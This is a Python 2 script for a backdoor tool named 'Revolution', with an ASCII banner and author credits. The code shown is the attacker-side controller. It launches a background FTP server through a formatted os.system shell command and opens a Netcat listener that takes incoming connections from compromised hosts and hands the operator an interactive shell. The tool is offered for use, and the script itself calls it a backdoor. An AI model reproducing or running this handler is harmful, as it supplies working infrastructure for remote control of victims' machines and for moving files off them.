#!/usr/bin/python2
#-*- coding:utf-8 -*-

import socket
import colorama
import nclib
from datetime import datetime
import time
import random
import sys
import argparse
import os
import platform
from ftplib import FTP
import readline
import thread

banner1 = '''
 ██▀███  ▓█████ ██▒   █▓ ▒█████   ██▓     █    ██ ▄▄▄█████▓ ██▓ ▒█████   ███▄    █ 
▓██ ▒ ██▒▓█   ▀▓██░   █▒▒██▒  ██▒▓██▒     ██  ▓██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒███   ▓██  █▒░▒██░  ██▒▒██░    ▓██  ▒██░▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒██   ██░▒██░    ▓▓█  ░██░░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
░██▓ ▒██▒░▒████▒  ▒▀█░  ░ ████▓▒░░██████▒▒▒█████▓   ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░ ▒░▒░▒░ ░ ▒░▓  ░░▒▓▒ ▒ ▒   ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░ ░ ░  ░  ░ ░░    ░ ▒ ▒░ ░ ░ ▒  ░░░▒░ ░ ░     ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░░   ░    ░       ░░  ░ ░ ░ ▒    ░ ░    ░░░ ░ ░   ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░        ░  ░     ░      ░ ░      ░  ░   ░               ░      ░ ░           ░ 
                    ░                                                              
'''

descrip = '''
                [Revolution - By 0x4eff (Unamed, Dxvistxr) - 2019]


            \033[1;96m[ \033[00mAuthor : \033[1;94m0x4eff     \033[1;96m]\033[00m
            \033[1;96m[ \033[00mGithub : \033[1;94mDxvistxr   \033[1;96m]\033[00m
            \033[1;96m[ \033[00mYoutube : \033[1;94mDavistar  \033[1;96m]\033[00m
            \033[1;96m[ \033[00mInstagram : \033[1;94m0x4eff  \033[1;96m]\033[00m
            \033[1;96m[ \033[00mVersion : \033[1;94m1.0       \033[1;96m]\033[00m

'''

def start_ftp_server(host,port,user,password,pathroot):
        try:
                check_ftp_server = os.path.exists('ftp_server.py')
                if check_ftp_server ==True:
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m FTP Server Found!')
                        os.system('python2 ftp_server.py %s %s %s %s %s > /dev/null 2>&1 &' % (host,port,user,password,pathroot))
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP Server Started !')
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP Host : %s' % (host))
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP Port : %s' % (port))
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP User : %s' % (user))
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP Password : %s' % (password))
                        print('\033[1;96m[\033[00m*\033[1;96m]\033[00m  FTP Path : %s' % (pathroot))
                else:
                        print('\033[1;96m[!] FTP Server Not Found !')

        except Exception as error_ftperror:
                print(error_ftperror)

def connect(LHOST,LPORT,ftpuser,ftppasswd,ftpproot):
        start_ftp_server(LHOST,'21',ftpuser,ftppasswd,ftpproot)
        print('\033[1;96m[\033[00m+\033[1;96m] \033[00mListening On %s:%s' % (LHOST,LPORT))
        nc = nclib.Netcat(listen=(LHOST,LPORT))
        data = nc.recv(4096)

        while True:
                try:
                        nc.interact()
                except KeyboardInterrupt:
                        print('[*] CTRL + C')


def revolution():
        if sys.version[0] =='3':
                sys.exit('[*] Please Run Backdoor With Python2')

        print("\033[1;96m%s" % (banner1))
        print(descrip)
        parser = argparse.ArgumentParser()
        print('\033[1;96m')
        parser.add_argument('lhost',type=str, help='Set Host')
        parser.add_argument('lport',type=int, help='Set Port')
        parser.add_argument('ftpuser',type=str,help='Set FTP User')
        parser.add_argument('ftppasswd',type=str,help='Set FTP Password')
        parser.add_argument('ftppath',type=str,help='Set FTP Path')
        args = parser.parse_args()
        print('\033[00m')
        connect(args.lhost,args.lport,args.ftpuser,args.ftppasswd,args.ftppath)

if __name__ == '__main__':
        revolution()